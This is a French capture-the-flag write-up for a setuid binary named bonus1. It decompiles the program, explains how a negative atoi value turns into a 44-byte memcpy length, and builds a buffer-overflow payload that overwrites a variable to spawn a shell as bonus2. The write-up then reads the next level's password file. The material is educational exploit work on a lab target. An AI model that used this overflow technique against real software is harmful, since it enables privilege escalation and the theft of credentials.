Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```bash
$ id && pwd && ls -la
uid=2011(bonus1) gid=2011(bonus1) groups=2011(bonus1),100(users)
/home/user/bonus1
total 17
dr-xr-x---+ 1 bonus1 bonus1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus1 bonus1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus1 bonus1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
-rw-r--r--+ 1 bonus1 bonus1   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus1 bonus1  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire `bonus1` :

```bash
$ ./bonus1
Segmentation fault (core dumped)
$ ./bonus1 dab
$ ./bonus1 dab itude
```

Sans succès, je me penche dès lors sur la décompilation.

J'utilise [Dogbolt](https://dogbolt.org/?id=e9dbc80b-2f99-46a6-8bbc-0ef4b8c2bda0#BinaryNinja=114&Reko=89) afin de décompiler le binaire du `bonus1`, qui a des protections contre la décompilation, mais certains décompilateurs réussissent.

Je recoupe la sortie de `RetDec` avec l'ASM et en extrait le probable code suivant :

```c
int main(int argc, char **argv)
{
    char buffer[40];
    int result;

    result = atoi(argv[1]); // <----------------1 user input to int, can't be above nine, but could be negative int overflown by multiplication
    if (result > 9)
        return 1;
    
    // <----------------------------------------2 below, user input is used to write memory allowing for overflow since len is multiplied by 4
    memcpy(buffer, argv[2], (size_t)result << 2);
    if (result == 0x574f4c46) // <--------------3 overflow rewrites the value of result here and allows passing the check
        execl("/bin/sh", "sh", 0); // <---------4 to shell access

    return 0;
}
```

D'après le code source, il semble qu'afin d'obtenir le shell, il faille passer la condition `result == 0x574f4c46` soit `result == 1464814662`.

En revanche, `result` ne peut pas être supérieur à 9. Il est cependant possible d'overflow la ligne :

```c
    memcpy(buffer, argv[2], (size_t)result << 2);
```

Si l'on réussit à passer ce check :

```c
    if (result > 9)
        return 1;
```

Puisque l'on pourra overflow le buffer de taille 40 avec une valeur de `result` supérieure à 10.
Je tente d'abord une approche avec un overflow de l'int, mais sans succès.

En utilisant la calculette de Windows cependant, pour essayer des opérations décimale/binaire autour des valeurs max et min de l'int, je tombe sur l'étonnante observation que :

`-2147483648 * n = 0` 

Et en effet, multiplier par 4 revient à faire un `n << 2`, donc, puisque la représentation binaire de `-2147483648` (INT_MIN) est :

`00000000000000000000000000000000`, après un left-shift de 2 bit, devient : `00000000000000000000000000000000`, soit 0.

Donc, puisque la représentation binaire de `-2147483647` (INT_MIN + 1) est : `10000000000000000000000000000001`, elle devient `00000000000000000000000000000100`, soit 4, après un left-shit de 2 bits (= une multiplication par 4).

Et ainsi de suite.

Je peux donc utiliser une valeur négative à passer à `atoi()`, puisque elle passera le `result > 9`, et sera multiplié par 4 au moment du `memcpy()`, ce qui va me permettre d'overflow le buffer et de changer la valeur de `result` afin de passer le dernier `if`.

Je dois donc créer un payload avec la structure suivante : `un nombre négatif me permettant d'overflow + padding (40 bytes) + la nouvelle valeur de result`.

En augmentant la valeur de l'INT_MIN jusqu'à `-2147483637`, dont la représentation binaire est `10000000000000000000000000001011`, et le left-bit shift de 2 résultant en : `00000000000000000000000000101100`, équivaut à 44.

Ce qui est un overflow de 4 bytes, ce qui est juste assez pour insérer la nouvelle valeur de l'int dans l'overflow, en d'autres termes, l'overflow écrira sur la zone mémoire de l'int `result` et changera donc sa valeur.

Je peux donc construire mon payload :

```
-2147483637 + "\x90" * 40 + 0x574f4c46
^^^^^^^^^^^   ^^^^^^^^^^^   ^^^^^^^^^^
result        buffer[40]    overflow sur result
```

Et l'essayer : 

```bash
$ ./bonus1 -2147483637 `python -c 'print("\x90"*40 + "\x57\x4f\x4c\x46"[::-1])'`
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$
```

Et c'est un succès !

